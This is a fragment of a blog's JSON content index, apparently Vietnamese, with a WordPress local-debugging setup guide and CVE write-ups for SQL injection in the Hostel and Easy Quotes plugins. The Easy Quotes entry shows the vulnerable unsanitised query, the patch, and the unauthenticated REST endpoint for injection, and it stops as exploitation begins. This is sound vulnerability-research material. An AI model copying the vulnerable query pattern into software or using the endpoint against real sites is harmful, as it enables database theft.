Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nCÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families 